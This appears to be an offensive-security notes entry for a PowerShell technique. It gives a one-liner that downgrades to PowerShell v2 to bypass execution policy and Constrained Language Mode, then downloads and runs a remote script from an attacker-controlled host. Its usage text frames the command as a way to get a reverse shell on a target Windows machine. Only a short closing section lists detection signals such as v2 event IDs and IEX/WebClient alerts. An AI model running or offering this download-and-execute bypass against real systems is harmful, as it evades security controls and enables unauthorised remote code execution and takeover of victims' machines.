---
type: code
language: ps1
verified: true
platforms:
  - Windows
tags:
  - bypass
  - download
  - powershell
validated: true
---

# powershell-v2-bypass-download-execute

## Code

```ps1
powershell.exe -version 2
powershell.exe -version 2 -ExecutionPolicy bypass
powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/rev.ps1')"
```

## Description

This code snippet demonstrates starting PowerShell v2 sessions and using it to download and execute a remote script, bypassing CLM as v2 does not enforce it. The final line is the key bypass command.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | IP address hosting the rev.ps1 script | 192.168.1.100 |

## Usage

Execute in a command prompt on a target Windows machine to fetch and run a payload like a reverse shell. Host rev.ps1 on an attacker-controlled server beforehand.

## Detection

- Monitor for PowerShell v2 invocations via event logs (Event ID 400-410).
- Network traffic to unexpected IPs on port 80/443 for downloads.
- AMSI or EDR alerts on IEX and WebClient usage, even in v2.

## Related

- [[procedures/Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]
- [[commands/powershell-v2-download-execute-script]]
